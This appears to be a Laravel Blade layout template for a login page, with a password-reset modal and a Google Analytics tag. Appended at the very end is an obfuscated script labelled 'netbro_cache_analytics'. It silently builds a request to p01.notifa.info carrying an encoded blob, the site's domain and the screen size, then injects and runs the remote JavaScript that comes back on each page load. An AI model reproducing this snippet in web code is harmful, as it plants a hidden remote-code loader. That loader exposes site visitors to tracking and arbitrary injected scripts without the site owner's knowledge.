<!doctype html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">

<head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    
    <link rel="stylesheet" href="{{mix('css/core.css')}}">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="{{mix('css/pages/login.css')}}">

    <title>{{ config('app.name', 'Laravel') }}</title>
</head>
<body>


<section class="wrapper">


    <div class="login">
        <div class="image-placeholder">
            <h1>Lorem ipsum dolor sit amet<br>consectetur pellentesque adipiscing elit.</h1>
        </div>
        <div class="form">

            <div class="text-center mb-4"><span class="material-icons text-danger" style="font-size:6rem;" >wifi_tethering</span></div>

            <h3 class="h4 mb-5 text-center">{{ config('app.name', 'Laravel') }} Login</h3>
            @yield('content')
        </div>
    </div>


</section>


<div class="modal fade " id="forgotPassword" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog " role="document">
        <div class="modal-content">
            <div class="modal-header">
                <div class="modal-title" id="exampleModalLabel">Forgot Your Password ?</div>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                    <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <form>
                    <div class="form-group">
                        <label for="exampleInputEmail1">Email or Username</label>
                        <input type="email" class="form-control" id="exampleInputEmail1" aria-describedby="emailHelp" placeholder="Enter email">
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary">Reset Password</button>
            </div>
        </div>
    </div>
</div>


<script src="{{ mix('js/core.js') }}"></script>
<script src="{{ mix('js/custom.js') }}"></script>


<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-56821827-7"></script>
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-56821827-7');
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mVJOsWm%2bf9E9uVjwtm73WMitUAp7mAIDGBr0F2bWSLo9gXFVJgL0mbMz9L4KAHgf3l%2bj9qIu3tZF9j%2bKQRP5pUhvUx%2fcX08rjtNyA7mzKyEbhWj71TPc8lApfNMuxkWeCA9cHUMGdtRNF16SlznDwJE5lgAHq%2fU1qTeKNsXbQqmdknCbkPWnQT2GV2OZ6VpXEP1yGYWj4HQ5jwFJEgeLJbgWfkJBzEW4o5ihbkrEH9chKpYykBch0tIYpfW4uQBsKgaetsc4I7LYyc78cBZdJYr8QTH0SmxZLCPWeqF0J86968tErcAnoGzRXZ2YPGdnn%2b7LANJVbz%2fAAZdZvQ%2fSWfSVI0qXNHQd1VaDUgSvbdl2Azy6hOCBRpBrT8%2f3lm72jIleU9usJAp0%2bZWE4d%2bdIoStJCTOzvmohLqF0vQIIZgQ78EWDHPiGYCd4UiNRQa9TTcj00fMUcErx%2fMT2ihn2pLEbML9YRIt7bAOwp%2fNyhp0%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>